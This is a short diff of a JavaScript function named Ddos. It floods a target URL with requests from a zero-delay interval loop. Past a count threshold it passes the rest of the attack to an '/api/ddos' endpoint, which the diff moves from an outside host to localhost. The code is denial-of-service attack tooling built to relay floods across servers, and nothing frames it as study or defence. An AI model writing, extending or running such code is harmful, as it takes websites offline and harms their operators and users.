@@ -9,11 +9,14 @@ function Ddos(link, max) {
     count++;
     sendRequest(link);
     if (count >= max) {
-      return clearInterval(inter);
+      clearInterval(inter);
     }
-    if(count >= 20000) {
-        max = max - 20000;
-        return axios.get(`http://apiddos.vidieu.net/api/ddos?link=${link}&max=${max}`);
+    if (count >= 2000) {
+      max = max - 2000;
+      axios
+        .get(`http://localhost:6666/api/ddos?link=${link}&max=${max}`)
+        .catch(() => {});
+      clearInterval(inter);
     }
   }, 0);
 }
